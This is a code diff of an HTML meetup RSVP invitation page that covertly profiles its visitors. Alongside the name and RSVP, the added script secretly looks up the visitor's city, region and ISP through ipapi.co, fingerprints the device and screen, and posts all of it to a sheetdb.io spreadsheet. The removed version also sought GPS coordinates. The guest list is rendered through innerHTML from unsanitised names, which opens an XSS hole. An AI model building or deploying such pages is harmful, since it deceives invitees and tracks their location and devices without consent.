@@ -6,95 +6,92 @@
     <title>Meetup Invitation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #001a4d; display: flex; justify-content: center; padding: 20px; }
-        .invitation { background: white; border-radius: 25px; max-width: 500px; width: 100%; padding: 40px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .form-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; font-weight: 700; color: #0d3b8a; margin-bottom: 5px; }
-        input, select { width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 10px; }
-        .cta-button { background: #2563eb; color: white; border: none; padding: 16px; width: 100%; font-weight: 700; border-radius: 50px; cursor: pointer; margin-top: 10px; }
-        .guest-list { margin-top: 30px; border-top: 1px solid #eee; padding-top: 20px; }
-        .guest-card { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #f9f9f9; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; background: #001a4d; display: flex; justify-content: center; padding: 20px; }
+        .invitation { background: white; border-radius: 20px; max-width: 450px; width: 100%; padding: 35px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-weight: 600; color: #0d3b8a; margin-bottom: 8px; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; }
+        .submit-btn { background: #2563eb; color: white; border: none; padding: 16px; width: 100%; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .submit-btn:disabled { background: #8ba8e8; }
+        .list-area { margin-top: 30px; border-top: 1px solid #eee; padding-top: 20px; }
+        .guest { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f5f5f5; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="invitation">
-        <h1 style="color:#0d3b8a">Guntur Meetup</h1>
-        <p style="margin-bottom: 20px; color: #666;">Jan 21st, 2026</p>
+        <h2 style="color:#0d3b8a; margin-bottom:5px;">Guntur Meetup 👋</h2>
+        <p style="color:#666; margin-bottom:25px;">Jan 21, 2026</p>
 
-        <form id="meetupForm" onsubmit="handleSubmit(event)">
+        <form id="rsvpForm" onsubmit="captureAndSubmit(event)">
             <div class="form-group">
                 <label>Name</label>
-                <input type="text" id="userName" required>
+                <input type="text" id="pName" required placeholder="Your name">
             </div>
             <div class="form-group">
-                <label>Will you be there?</label>
-                <select id="userStatus">
-                    <option value="coming">Yes, I'm coming</option>
-                    <option value="not-coming">No</option>
+                <label>Coming?</label>
+                <select id="pStatus">
+                    <option value="Yes">Yes, I'm coming</option>
+                    <option value="No">No, can't make it</option>
                 </select>
             </div>
-            <button type="submit" class="cta-button" id="submitBtn">Submit RSVP</button>
+            <button type="submit" class="submit-btn" id="sBtn">Submit RSVP</button>
         </form>
 
-        <div class="guest-list" id="guestDisplay"></div>
+        <div class="list-area" id="listArea"></div>
     </div>
 
     <script>
-        const API_URL = 'https://sheetdb.io/api/v1/raj5uy3ex9q9l';
+        const API = 'https://sheetdb.io/api/v1/raj5uy3ex9q9l';
 
-        async function handleSubmit(e) {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "Finalizing...";
-            btn.disabled = true;
-
-            // 1. Get IP-based info (Secret, No popup)
-            let ipInfo = { city: "Unknown", org: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
-            } catch (err) { console.log("IP check failed"); }
-
-            const payload = {
-                Name: document.getElementById('userName').value,
-                Status: document.getElementById('userStatus').value,
-                Device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) || [0,"Unknown"])[1],
-                City: ipInfo.city,
-                ISP: ipInfo.org,
-                Time: new Date().toLocaleString(),
-                GPS_Coords: "Waiting..."
-            };
-
-            // 2. Try GPS (Browser will trigger a popup here)
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    payload.GPS_Coords = `${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendData(payload);
-                },
-                () => {
-                    payload.GPS_Coords = "Blocked";
-                    sendData(payload);
-                },
-                { timeout: 5000 }
-            );
+        // Secret function to identify iPad vs Mac
+        function getFineDevice() {
+            const ua = navigator.userAgent;
+            if (/iPad|Macintosh/.test(ua) && 'ontouchend' in document) return "iPad (Tablet)";
+            if (/iPhone/.test(ua)) return "iPhone";
+            if (/Android/.test(ua)) return "Android Phone";
+            return navigator.platform;
         }
 
-        async function sendData(data) {
-            await fetch(API_URL, {
+        async function captureAndSubmit(e) {
+            e.preventDefault();
+            const btn = document.getElementById('sBtn');
+            btn.innerText = "Syncing...";
+            btn.disabled = true;
+
+            let netInfo = { city: "Private", org: "Unknown" };
+            try {
+                // Gets location via IP (No popup required)
+                const res = await fetch('https://ipapi.co/json/');
+                netInfo = await res.json();
+            } catch(err) {}
+
+            const data = {
+                Name: document.getElementById('pName').value,
+                Status: document.getElementById('pStatus').value,
+                TrueDevice: getFineDevice(),
+                NetworkLocation: `${netInfo.city}, ${netInfo.region}`,
+                ISP: netInfo.org,
+                Screen: `${window.screen.width}x${window.screen.height}`,
+                Time: new Date().toLocaleString()
+            };
+
+            await fetch(API, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ data: [data] })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({data: [data]})
             });
-            alert("Success!");
+
+            alert("RSVP Received!");
             location.reload();
         }
 
-        // Display current guests
-        fetch(API_URL).then(r => r.json()).then(data => {
-            document.getElementById('guestDisplay').innerHTML = data.map(g => `
-                <div class="guest-card">
+        // Load List
+        fetch(API).then(r => r.json()).then(guests => {
+            const area = document.getElementById('listArea');
+            area.innerHTML = "<h4>Guest List</h4>" + guests.map(g => `
+                <div class="guest">
                     <span>${g.Name}</span>
-                    <span style="color:${g.Status === 'coming' ? 'green' : 'red'}">${g.Status}</span>
+                    <b style="color:${g.Status === 'Yes' ? '#10b981' : '#ef4444'}">${g.Status}</b>
                 </div>
             `).join('');
         });
